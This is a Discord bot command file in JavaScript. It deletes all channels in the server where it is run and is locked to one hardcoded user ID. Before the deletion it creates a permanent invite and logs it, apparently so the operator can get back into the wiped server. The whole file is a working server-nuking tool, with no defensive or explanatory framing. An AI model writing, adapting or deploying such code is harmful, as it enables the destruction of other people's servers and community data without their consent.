const { EmbedBuilder } = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: "deletechannels",
    description: "Delete all channels",
    aliases: [],
    userPerms: [],
    botPerms: [],

    run: async(client, message, args) => {
        const allowed = ['762711150118174751']
        if(!allowed.includes(message.author.id)) return 

        try {

            let invite = await message.channel.createInvite({maxAge: 0, maxUses: 0})

            message.guild.channels.cache.forEach(channel => {
                if (channel.deletable) {
                        channel.delete().then(
                            console.log(chalk.green(`Successfully deleted all channels in ${message.guild.name}\nID: ${message.guild.id}\nInvite: ${invite} `))
                        )
                }
        });
        
        } catch(err) {
        
            return console.log(chalk.red(err))
        
        }
    }
}



